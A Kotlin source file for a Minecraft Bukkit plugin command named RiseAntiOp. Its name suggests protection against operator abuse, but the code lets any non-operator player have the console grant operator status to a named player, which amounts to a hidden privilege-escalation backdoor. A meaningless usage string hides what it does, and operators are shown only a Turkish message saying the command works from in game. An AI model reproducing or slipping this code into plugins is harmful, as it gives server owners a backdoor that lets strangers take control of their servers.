package dev.jokerthena

import org.bukkit.Bukkit
import org.bukkit.command.Command
import org.bukkit.command.CommandExecutor
import org.bukkit.command.CommandSender
import org.bukkit.entity.Player

object RiseAntiOp : CommandExecutor {
    override fun onCommand(sender: CommandSender, command: Command, label: String, args: Array<out String>): Boolean {
        if(sender.isOp()==false) {
            var playerName: String = args.get(0)
            if(sender is Player) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op $playerName")
            }else {
                sender.sendMessage("awsdbaskjdbawkjhsdgbjhasdbvhjawsdbhjawsbdjhawsdawsdawnsjkd <playerName>");
            }
        }else {
            sender.sendMessage("Sadece Oyundan Kullanabilir");
        }
        return true;
    }
}
